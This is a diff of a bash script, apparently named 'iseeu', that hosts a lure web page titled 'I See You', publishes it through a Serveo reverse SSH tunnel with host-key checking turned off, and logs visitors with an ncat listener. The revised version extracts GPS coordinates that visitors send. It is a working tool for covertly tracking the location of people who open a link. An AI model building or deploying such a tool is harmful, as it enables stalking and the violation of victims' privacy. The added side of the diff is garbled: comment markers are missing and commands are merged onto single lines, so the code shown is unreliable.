@@ -2,33 +2,29 @@
 
 clear
 
-# Prompt for server port
-read -p "[?] Enter port to use for local server (default 8080): " SERVER_PORT
-SERVER_PORT=${SERVER_PORT:-8080}
+Prompt for server port
 
-# Prompt for ncat port
-read -p "[?] Enter port to use for logging with Ncat (must differ, default 9999): " NCAT_PORT
-NCAT_PORT=${NCAT_PORT:-9999}
+read -p "[?] Enter port to use for local server (default 8080): " SERVER_PORT SERVER_PORT=${SERVER_PORT:-8080}
 
-WEB_DIR="$HOME/webpage"
-LOG_FILE="$HOME/iseeu/logs/log_$(date '+%Y-%m-%d_%H-%M-%S').txt"
-mkdir -p "$(dirname "$LOG_FILE")"
+Prompt for ncat port
 
-echo "[*] Killing existing processes..."
-pkill -f "python3 -m http.server" 2>/dev/null
-pkill -f ncat 2>/dev/null
-pkill -f "ssh -o ServerAliveInterval" 2>/dev/null
-sleep 1
+read -p "[?] Enter port to use for logging with Ncat (default 9999): " NCAT_PORT NCAT_PORT=${NCAT_PORT:-9999}
 
-echo "[*] Creating/clearing web directory: $WEB_DIR"
-mkdir -p "$WEB_DIR"
-rm -f "$WEB_DIR/index.html"
-cd "$WEB_DIR" || exit 1
+WEB_DIR="$HOME/webpage" LOG_DIR="$HOME/iseeu/logs" TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S') LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"
 
-echo "[*] Creating payload HTML..."
-cat > index.html <<EOF
-<!DOCTYPE html>
-<html>
+Cleanup existing processes
+
+echo "[*] Killing existing processes..." pkill -f "python3 -m http.server" 2>/dev/null pkill -f ncat 2>/dev/null pkill -f autossh 2>/dev/null sleep 1
+
+Setup directories
+
+echo "[*] Preparing directories..." mkdir -p "$WEB_DIR" mkdir -p "$LOG_DIR" rm -f "$WEB_DIR/index.html" touch "$LOG_FILE"
+
+Create payload HTML
+
+cat > "$WEB_DIR/index.html" <<EOF
+
+<!DOCTYPE html><html>
 <head>
     <title>I See You</title>
     <script>
@@ -48,50 +44,21 @@ cat > index.html <<EOF
     <h1>Loading...</h1>
 </body>
 </html>
-EOF
+EOFStart Python web server
 
-echo "[*] Starting local server on port $SERVER_PORT..."
-python3 -m http.server "$SERVER_PORT" > /dev/null 2>&1 &
-SERVER_PID=$!
-sleep 2
-echo "[+] Python server running (PID $SERVER_PID)"
+cd "$WEB_DIR" || exit 1 python3 -m http.server "$SERVER_PORT" > /dev/null 2>&1 & SERVER_PID=$! echo "[+] Python server running on port $SERVER_PORT (PID $SERVER_PID)"
 
-echo "[*] Starting Serveo tunnel..."
-serveo_tunnel() {
-    ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o StrictHostKeyChecking=no -R 80:localhost:$SERVER_PORT serveo.net > serveo.log 2>&1
-}
-serveo_tunnel &
-SSH_PID=$!
-sleep 5
+Start Serveo tunnel with autossh
 
-TUNNEL_URL=$(grep -oE "https://[a-zA-Z0-9]+\.serveo.net" serveo.log | head -n1)
-if [ -n "$TUNNEL_URL" ]; then
-    echo "[✓] Public URL: $TUNNEL_URL"
-else
-    echo "[✗] Failed to get Serveo URL."
-    kill $SERVER_PID $SSH_PID
-    exit 1
-fi
+echo "[*] Starting Serveo tunnel with autossh..." autossh -M 0 -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o StrictHostKeyChecking=no -R 80:localhost:$SERVER_PORT serveo.net > serveo.log 2>&1 & AUTOSSH_PID=$! sleep 5
 
-# Auto-restart Serveo if it crashes
-echo "[*] Starting Serveo watchdog..."
-(
-while true; do
-    if ! pgrep -f "ssh.*serveo.net" > /dev/null; then
-        echo "[!] Serveo tunnel down. Restarting..."
-        serveo_tunnel &
-    fi
-    sleep 30
-done
-) &
+TUNNEL_URL=$(grep -oE "https://[a-zA-Z0-9]+\.serveo\.net" serveo.log | head -n1) if [ -n "$TUNNEL_URL" ]; then echo "[\u2713] Public URL: $TUNNEL_URL" else echo "[\u2717] Failed to get Serveo URL." kill $SERVER_PID $AUTOSSH_PID 2>/dev/null exit 1 fi
 
-echo "[*] Logging connections with ncat on port $NCAT_PORT..."
-ncat -lvkp "$NCAT_PORT" | while read -r line; do
-    echo "$(date): $line" >> "$LOG_FILE"
-done &
-NCAT_PID=$!
+Start Ncat logger
 
-trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $SSH_PID $NCAT_PID 2>/dev/null; exit' INT
+echo "[*] Logging connections to $LOG_FILE..." ncat -lvkp "$NCAT_PORT" --ssl --exec "/bin/bash -c ' while read line; do if [[ $line == "/log?loc=" ]]; then gps="$(echo $line | cut -d"=" -f2)" echo "GPS: $gps | Time: \$(date)" >> '$LOG_FILE' fi done '" & NCAT_PID=$!
 
-echo "[*] Press Ctrl+C to stop."
-wait
+trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $AUTOSSH_PID $NCAT_PID 2>/dev/null; exit' INT
+
+echo "[*] Press Ctrl+C to stop." wait
+
